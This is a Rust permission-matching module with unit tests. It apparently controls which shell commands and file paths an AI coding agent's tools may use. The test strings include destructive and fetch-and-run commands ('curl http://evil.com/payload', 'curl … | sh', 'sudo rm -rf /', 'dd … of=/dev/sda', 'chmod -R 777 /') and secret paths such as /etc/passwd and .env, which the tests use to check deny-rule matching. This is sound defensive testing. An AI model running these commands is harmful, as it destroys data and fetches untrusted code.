mod evaluator;
mod glob;
mod parsing;
mod regex;

// ── Re-exports from sub-modules ──────────────────────────────────────────────

pub use evaluator::{resolve_pattern_path, rule_matches_operation, rule_matches_tool};
pub use glob::path_matches_glob;
pub use parsing::{compile_glob, is_known_tool, parse_permission_string, session_key};
pub use regex::{
    command_matches_at_word_boundary, command_matches_pattern, command_matches_wildcard,
};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{FileOp, PermissionRule, RuleAction, ToolPattern};
    use std::path::Path;

    // ── is_known_tool ────────────────────────────────────────────────────

    #[test]
    fn test_is_known_tool_bash() {
        assert!(is_known_tool("bash"));
    }

    #[test]
    fn test_is_known_tool_read() {
        assert!(is_known_tool("Read"));
    }

    #[test]
    fn test_is_known_tool_write() {
        assert!(is_known_tool("WRITE"));
    }

    #[test]
    fn test_is_known_tool_edit() {
        assert!(is_known_tool("edit"));
    }

    #[test]
    fn test_is_known_tool_search_grep() {
        assert!(is_known_tool("search_grep"));
    }

    #[test]
    fn test_is_known_tool_searchgrep() {
        assert!(is_known_tool("searchgrep"));
    }

    #[test]
    fn test_is_known_tool_unknown() {
        assert!(!is_known_tool("unknown_tool"));
    }

    #[test]
    fn test_is_known_tool_case_insensitive() {
        assert!(is_known_tool("BASH"));
        assert!(is_known_tool("READ"));
        assert!(is_known_tool("Search_Grep"));
    }

    // ── parse_permission_string ──────────────────────────────────────────

    #[test]
    fn test_parse_read_permission() {
        let result = parse_permission_string("Read(./.env)");
        assert!(result.is_some());
        let (tool_pattern, inner) = result.unwrap();
        assert!(tool_pattern.is_some());
        let tp = tool_pattern.unwrap();
        assert_eq!(tp.name, "read");
        assert_eq!(tp.pattern, "./.env");
        assert_eq!(inner, "./.env");
    }

    #[test]
    fn test_parse_bash_permission() {
        let result = parse_permission_string("Bash(echo hello)");
        assert!(result.is_some());
        let (tool_pattern, inner) = result.unwrap();
        assert!(tool_pattern.is_some());
        let tp = tool_pattern.unwrap();
        assert_eq!(tp.name, "bash");
        assert_eq!(tp.pattern, "echo hello");
        assert_eq!(inner, "echo hello");
    }

    #[test]
    fn test_parse_write_permission() {
        let result = parse_permission_string("Write(/path/to/file)");
        assert!(result.is_some());
        let (tool_pattern, inner) = result.unwrap();
        assert!(tool_pattern.is_some());
        let tp = tool_pattern.unwrap();
        assert_eq!(tp.name, "write");
        assert_eq!(tp.pattern, "/path/to/file");
        assert_eq!(inner, "/path/to/file");
    }

    #[test]
    fn test_parse_bare_pattern_no_tool() {
        let result = parse_permission_string("./.env");
        assert!(result.is_some());
        let (tool_pattern, inner) = result.unwrap();
        assert!(tool_pattern.is_none());
        assert_eq!(inner, "./.env");
    }

    #[test]
    fn test_parse_bare_pattern_absolute() {
        let result = parse_permission_string("/etc/passwd");
        assert!(result.is_some());
        let (tool_pattern, inner) = result.unwrap();
        assert!(tool_pattern.is_none());
        assert_eq!(inner, "/etc/passwd");
    }

    #[test]
    fn test_parse_empty_string_rejected() {
        let result = parse_permission_string("");
        assert!(result.is_none());
    }

    #[test]
    fn test_parse_no_parens_is_bare_not_error() {
        // "Read" without parens is not a ToolName(pattern) — it's a bare pattern
        let result = parse_permission_string("Read");
        assert!(result.is_some());
        let (tool_pattern, inner) = result.unwrap();
        assert!(tool_pattern.is_none());
        assert_eq!(inner, "Read");
    }

    #[test]
    fn test_parse_empty_tool_name_rejected() {
        let result = parse_permission_string("(./foo)");
        assert!(result.is_none());
    }

    #[test]
    fn test_parse_empty_pattern_rejected() {
        let result = parse_permission_string("Read()");
        assert!(result.is_none());
    }

    #[test]
    fn test_parse_unknown_tool_rejected() {
        let result = parse_permission_string("UnknownTool(./foo)");
        assert!(result.is_none());
    }

    #[test]
    fn test_parse_tool_name_case_insensitive() {
        let result = parse_permission_string("READ(./.env)");
        assert!(result.is_some());
        let (tool_pattern, _) = result.unwrap();
        assert!(tool_pattern.is_some());
        assert_eq!(tool_pattern.unwrap().name, "read");
    }

    // ── compile_glob ─────────────────────────────────────────────────────

    #[test]
    fn test_compile_valid_glob() {
        let matcher = compile_glob("**/*.env");
        assert!(matcher.is_ok());
    }

    #[test]
    fn test_compile_invalid_glob() {
        let result = compile_glob("[invalid");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("invalid glob pattern"));
    }

    #[test]
    fn test_compile_glob_matches() {
        let matcher = compile_glob("*.rs").unwrap();
        assert!(matcher.is_match("lib.rs"));
        assert!(!matcher.is_match("lib.txt"));
    }

    // ── path_matches_glob ────────────────────────────────────────────────

    #[test]
    fn test_path_matches_glob_relative_pattern() {
        let matcher = compile_glob("**/*.env").unwrap();
        assert!(matcher.is_match(Path::new(".env")));
        assert!(matcher.is_match(Path::new("subdir/.env")));
    }

    #[test]
    fn test_path_matches_glob_in_workspace() {
        let workspace = Path::new("/workspace");
        // A path that is within the workspace
        assert!(path_matches_glob(
            &workspace.join("src/main.rs"),
            "src/main.rs",
            workspace,
        ));
    }

    #[test]
    fn test_path_matches_glob_absolute() {
        let workspace = Path::new("/workspace");
        // An absolute path outside workspace
        assert!(path_matches_glob(
            Path::new("/etc/passwd"),
            "/etc/passwd",
            workspace,
        ));
    }

    #[test]
    fn test_path_matches_glob_no_match() {
        let workspace = Path::new("/workspace");
        assert!(!path_matches_glob(
            &workspace.join("Cargo.toml"),
            "*.rs",
            workspace,
        ));
    }

    #[test]
    fn test_path_matches_glob_invalid_pattern() {
        let workspace = Path::new("/workspace");
        // Invalid pattern should return false, not panic
        assert!(!path_matches_glob(
            &workspace.join("foo.txt"),
            "[invalid",
            workspace,
        ));
    }

    // ── session_key ──────────────────────────────────────────────────────

    #[test]
    fn test_session_key_format() {
        assert_eq!(session_key("Read", "./.env"), "read:./.env");
    }

    #[test]
    fn test_session_key_lowercases_tool() {
        assert_eq!(session_key("BASH", "echo hi"), "bash:echo hi");
    }

    #[test]
    fn test_session_key_preserves_pattern_case() {
        assert_eq!(session_key("write", "./Foo.Bar"), "write:./Foo.Bar");
    }

    // ── command_matches_pattern ──────────────────────────────────────────

    #[test]
    fn test_command_matches_substring() {
        assert!(command_matches_pattern("echo hello world", "hello"));
    }

    #[test]
    fn test_command_matches_case_insensitive() {
        assert!(command_matches_pattern("ECHO hello", "echo"));
    }

    #[test]
    fn test_command_matches_case_insensitive_reverse() {
        assert!(command_matches_pattern("echo hello", "ECHO"));
    }

    #[test]
    fn test_command_matches_no_match() {
        assert!(!command_matches_pattern("ls -la", "rm"));
    }

    #[test]
    fn test_command_matches_empty_pattern() {
        assert!(command_matches_pattern("anything", ""));
    }

    #[test]
    fn test_command_matches_empty_command() {
        assert!(!command_matches_pattern("", "something"));
    }

    // ── command_matches_wildcard ──────────────────────────────────────────

    #[test]
    fn test_wildcard_curl_asterisk_matches_curl_url() {
        assert!(command_matches_wildcard(
            "curl https://example.com",
            "curl *",
        ));
        assert!(command_matches_wildcard(
            "curl http://evil.com/payload",
            "curl *",
        ));
    }

    #[test]
    fn test_wildcard_curl_asterisk_does_not_match_other_commands() {
        assert!(!command_matches_wildcard(
            "wget https://example.com",
            "curl *"
        ));
        assert!(!command_matches_wildcard("echo curl", "curl *"));
    }

    #[test]
    fn test_wildcard_wget_asterisk_matches_wget_url() {
        assert!(command_matches_wildcard(
            "wget http://example.com/payload",
            "wget *",
        ));
    }

    #[test]
    fn test_wildcard_ssh_asterisk_matches_ssh_command() {
        assert!(command_matches_wildcard("ssh user@host", "ssh *",));
        assert!(command_matches_wildcard("ssh -p 2222 user@host", "ssh *",));
    }

    #[test]
    fn test_wildcard_bare_asterisk_matches_everything() {
        assert!(command_matches_wildcard("anything at all", "*"));
        assert!(command_matches_wildcard("", "*"));
        assert!(command_matches_wildcard("echo hello", "*"));
    }

    #[test]
    fn test_wildcard_cargo_asterisk_matches_subcommands() {
        assert!(command_matches_wildcard("cargo build", "cargo *"));
        assert!(command_matches_wildcard("cargo check", "cargo *"));
        assert!(command_matches_wildcard("cargo build --release", "cargo *",));
    }

    #[test]
    fn test_wildcard_cargo_asterisk_does_not_match_non_cargo() {
        assert!(!command_matches_wildcard("run cargo build", "cargo *"));
        assert!(!command_matches_wildcard("echo cargo", "cargo *"));
    }

    #[test]
    fn test_wildcard_sudo_asterisk_matches_sudo_commands() {
        assert!(command_matches_wildcard("sudo rm -rf /", "sudo *"));
        assert!(command_matches_wildcard("sudo apt-get update", "sudo *",));
    }

    #[test]
    fn test_wildcard_no_wildcard_falls_back_to_substring() {
        // Pattern with no * should behave like substring match
        assert!(command_matches_wildcard("echo hello world", "hello"));
        assert!(!command_matches_wildcard("echo hello world", "goodbye"));
        assert!(command_matches_wildcard("ECHO HELLO", "echo"));
    }

    #[test]
    fn test_wildcard_case_insensitive() {
        assert!(command_matches_wildcard(
            "CURL https://example.com",
            "curl *"
        ));
        assert!(command_matches_wildcard(
            "curl https://example.com",
            "CURL *"
        ));
    }

    #[test]
    fn test_wildcard_curl_piped_to_sh() {
        assert!(command_matches_wildcard(
            "curl https://example.com | sh",
            "curl * | sh",
        ));
    }

    #[test]
    fn test_wildcard_trailing_segment_must_match_end() {
        // "curl * | sh" should not match "curl https://example.com | bash"
        assert!(!command_matches_wildcard(
            "curl https://example.com | bash",
            "curl * | sh",
        ));
    }

    #[test]
    fn test_wildcard_leading_segment_must_match_start() {
        // "curl *" should not match "run curl https://example.com"
        assert!(!command_matches_wildcard(
            "run curl https://example.com",
            "curl *",
        ));
    }

    #[test]
    fn test_wildcard_empty_pattern_matches() {
        assert!(command_matches_wildcard("anything", ""));
    }

    #[test]
    fn test_wildcard_empty_command_no_match_for_non_empty_pattern() {
        assert!(!command_matches_wildcard("", "curl *"));
    }

    #[test]
    fn test_wildcard_asterisk_in_middle() {
        // "git * branch" should match "git checkout branch"
        assert!(command_matches_wildcard(
            "git checkout branch",
            "git * branch",
        ));
    }

    #[test]
    fn test_wildcard_multiple_asterisks() {
        // "* rm *" should match anything with rm
        assert!(command_matches_wildcard("sudo rm -rf /", "* rm *",));
        assert!(!command_matches_wildcard("echo hello", "* rm *"));
    }

    #[test]
    fn test_wildcard_curl_alone_no_arg_not_matched_by_curl_space_asterisk() {
        // "curl" alone shouldn't match "curl *" (need at least a space after)
        assert!(!command_matches_wildcard("curl", "curl *"));
    }

    #[test]
    fn test_wildcard_curl_asterisk_no_space() {
        // "curl*" should match anything starting with "curl"
        assert!(command_matches_wildcard("curl", "curl*"));
        assert!(command_matches_wildcard(
            "curl https://example.com",
            "curl*"
        ));
        assert!(command_matches_wildcard("curlhttp://example.com", "curl*"));
    }

    // ── command_matches_at_word_boundary ──────────────────────────────────

    #[test]
    fn test_word_boundary_dd_matches_at_start() {
        assert!(command_matches_at_word_boundary(
            "dd if=/dev/zero of=/dev/sda bs=4M",
            "dd",
            false,
        ));
    }

    #[test]
    fn test_word_boundary_dd_does_not_match_inside_word() {
        assert!(!command_matches_at_word_boundary("git add .", "dd", false));
        assert!(!command_matches_at_word_boundary(
            "cat address_book.txt",
            "dd",
            false
        ));
        assert!(!command_matches_at_word_boundary(
            "echo hidden",
            "dd",
            false
        ));
    }

    #[test]
    fn test_word_boundary_su_matches_at_start() {
        assert!(command_matches_at_word_boundary("su - root", "su", false));
    }

    #[test]
    fn test_word_boundary_su_matches_with_space_prefix() {
        assert!(command_matches_at_word_boundary(
            "run su - root",
            "su",
            false
        ));
    }

    #[test]
    fn test_word_boundary_su_does_not_match_inside_word() {
        assert!(!command_matches_at_word_boundary(
            "cat /etc/issue",
            "su",
            false
        ));
        assert!(!command_matches_at_word_boundary(
            "source .env",
            "su",
            false
        ));
        assert!(!command_matches_at_word_boundary("echo sure", "su", false));
        assert!(!command_matches_at_word_boundary(
            "grep -r result .",
            "su",
            false
        ));
    }

    #[test]
    fn test_word_boundary_case_insensitive() {
        assert!(command_matches_at_word_boundary(
            "DD if=/dev/zero",
            "dd",
            false
        ));
        assert!(!command_matches_at_word_boundary(
            "DD if=/dev/zero",
            "dd",
            true
        ));
    }

    #[test]
    fn test_word_boundary_case_sensitive() {
        assert!(command_matches_at_word_boundary(
            "chmod -R 777 /",
            "chmod -R",
            true
        ));
        assert!(!command_matches_at_word_boundary(
            "chmod -r file",
            "chmod -R",
            true
        ));
    }

    #[test]
    fn test_word_boundary_empty_pattern() {
        assert!(command_matches_at_word_boundary("anything", "", false));
    }

    #[test]
    fn test_word_boundary_no_match() {
        assert!(!command_matches_at_word_boundary("ls -la", "rm", false));
    }

    #[test]
    fn test_word_boundary_respects_punctuation() {
        // "dd" followed by non-word char like '=' should match
        assert!(command_matches_at_word_boundary(
            "dd=something",
            "dd",
            false
        ));
        // "dd" as a standalone command
        assert!(command_matches_at_word_boundary("dd", "dd", false));
    }

    // ── resolve_pattern_path ─────────────────────────────────────────────

    #[test]
    fn test_resolve_relative_path() {
        let workspace = Path::new("/workspace");
        let resolved = resolve_pattern_path("src/main.rs", workspace);
        assert_eq!(resolved, "/workspace/src/main.rs");
    }

    #[test]
    fn test_resolve_absolute_path() {
        let workspace = Path::new("/workspace");
        let resolved = resolve_pattern_path("/etc/passwd", workspace);
        assert_eq!(resolved, "/etc/passwd");
    }

    #[test]
    fn test_resolve_tilde_path() {
        let workspace = Path::new("/workspace");
        let resolved = resolve_pattern_path("~/config.json", workspace);
        // Should resolve ~ to home dir
        if let Some(home) = home::home_dir() {
            let expected = home.join("config.json").to_string_lossy().to_string();
            assert_eq!(resolved, expected);
        }
    }

    #[test]
    fn test_resolve_tilde_only() {
        let workspace = Path::new("/workspace");
        let resolved = resolve_pattern_path("~", workspace);
        if let Some(home) = home::home_dir() {
            assert_eq!(resolved, home.to_string_lossy().to_string());
        }
    }

    // ── rule_matches_tool ────────────────────────────────────────────────

    #[test]
    fn test_rule_matches_tool_no_tool_pattern() {
        let rule = PermissionRule {
            tool_pattern: None,
            path_pattern: None,
            command_pattern: None,
            operation: None,
            action: RuleAction::Allow,
        };
        assert!(rule_matches_tool(&rule, "bash"));
        assert!(rule_matches_tool(&rule, "read"));
    }

    #[test]
    fn test_rule_matches_tool_matching() {
        let rule = PermissionRule {
            tool_pattern: Some(ToolPattern {
                name: "read".into(),
                pattern: "./*".into(),
            }),
            path_pattern: None,
            command_pattern: None,
            operation: None,
            action: RuleAction::Allow,
        };
        assert!(rule_matches_tool(&rule, "read"));
    }

    #[test]
    fn test_rule_matches_tool_case_insensitive() {
        let rule = PermissionRule {
            tool_pattern: Some(ToolPattern {
                name: "read".into(),
                pattern: "./*".into(),
            }),
            path_pattern: None,
            command_pattern: None,
            operation: None,
            action: RuleAction::Allow,
        };
        assert!(rule_matches_tool(&rule, "READ"));
    }

    #[test]
    fn test_rule_matches_tool_not_matching() {
        let rule = PermissionRule {
            tool_pattern: Some(ToolPattern {
                name: "read".into(),
                pattern: "./*".into(),
            }),
            path_pattern: None,
            command_pattern: None,
            operation: None,
            action: RuleAction::Allow,
        };
        assert!(!rule_matches_tool(&rule, "bash"));
    }

    // ── rule_matches_operation ───────────────────────────────────────────

    #[test]
    fn test_rule_matches_operation_path_rule() {
        // A path-only rule (has path_pattern, no command_pattern)
        let rule = PermissionRule {
            tool_pattern: None,
            path_pattern: Some("**/*.env".into()),
            command_pattern: None,
            operation: None,
            action: RuleAction::Deny,
        };
        assert!(rule_matches_operation(&rule, &FileOp::Read));
        assert!(rule_matches_operation(&rule, &FileOp::Write));
    }

    #[test]
    fn test_rule_matches_operation_command_only_rule() {
        // A command-only rule (has command_pattern, no path_pattern)
        let rule = PermissionRule {
            tool_pattern: None,
            path_pattern: None,
            command_pattern: Some("rm".into()),
            operation: None,
            action: RuleAction::Deny,
        };
        // Command-only rules don't apply to file operations
        assert!(!rule_matches_operation(&rule, &FileOp::Read));
        assert!(!rule_matches_operation(&rule, &FileOp::Write));
    }

    #[test]
    fn test_rule_matches_operation_path_rule_applies_to_read_and_write() {
        // Path-only rules apply to ALL operations (current semantics)
        let rule = PermissionRule {
            tool_pattern: None,
            path_pattern: Some("**/*.env".into()),
            command_pattern: None,
            operation: None,
            action: RuleAction::Deny,
        };
        // Both Read and Write are matched
        assert!(rule_matches_operation(&rule, &FileOp::Read));
        assert!(rule_matches_operation(&rule, &FileOp::Write));
    }

    #[test]
    fn test_rule_matches_operation_combined_rule_applies_to_all_ops() {
        // A combined rule (both path and command) also applies to all operations
        let rule = PermissionRule {
            tool_pattern: None,
            path_pattern: Some("**/secrets/*".into()),
            command_pattern: Some("cat".into()),
            operation: None,
            action: RuleAction::Deny,
        };
        assert!(rule_matches_operation(&rule, &FileOp::Read));
        assert!(rule_matches_operation(&rule, &FileOp::Write));
    }

    #[test]
    fn test_rule_matches_operation_filter_read_only() {
        // A rule with operation: Read should only match Read, not Write
        let rule = PermissionRule {
            tool_pattern: None,
            path_pattern: Some("*.txt".into()),
            command_pattern: None,
            operation: Some(FileOp::Read),
            action: RuleAction::Deny,
        };
        assert!(rule_matches_operation(&rule, &FileOp::Read));
        assert!(!rule_matches_operation(&rule, &FileOp::Write));
    }

    #[test]
    fn test_rule_matches_operation_filter_write_only() {
        // A rule with operation: Write should only match Write, not Read
        let rule = PermissionRule {
            tool_pattern: None,
            path_pattern: Some("*.txt".into()),
            command_pattern: None,
            operation: Some(FileOp::Write),
            action: RuleAction::Deny,
        };
        assert!(!rule_matches_operation(&rule, &FileOp::Read));
        assert!(rule_matches_operation(&rule, &FileOp::Write));
    }

    #[test]
    fn test_rule_matches_operation_op_param_default_all_ops() {
        // Verify the current semantic: path-only rules ignore the specific op
        let rule = PermissionRule {
            tool_pattern: None,
            path_pattern: Some("*.txt".into()),
            command_pattern: None,
            operation: None,
            action: RuleAction::Allow,
        };
        // All file ops get the same answer
        assert_eq!(
            rule_matches_operation(&rule, &FileOp::Read),
            rule_matches_operation(&rule, &FileOp::Write),
        );
    }
}
